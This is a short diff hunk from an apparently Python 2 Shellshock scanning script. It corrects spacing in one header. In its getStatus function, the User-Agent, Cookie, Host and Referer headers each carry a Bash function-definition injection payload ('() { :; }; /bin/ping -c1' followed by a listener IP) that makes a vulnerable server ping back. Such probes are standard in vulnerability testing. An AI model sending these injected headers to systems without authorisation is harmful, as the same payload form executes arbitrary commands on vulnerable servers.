@@ -26,7 +26,7 @@ def getStatus(ourl):
     USER_AGENT = "() { :; }; /bin/ping -c1 " + IP_listner
     Cookie = "() { :; }; /bin/ping -c1 " + IP_listner
     Host = "() { :; }; /bin/ping -c1 " + IP_listner
-    Referer = "() { :; }; /bin/ping -c1" + IP_listner
+    Referer = "() { :; }; /bin/ping -c1 " + IP_listner
     try:
      url = urlparse(ourl)
      print url
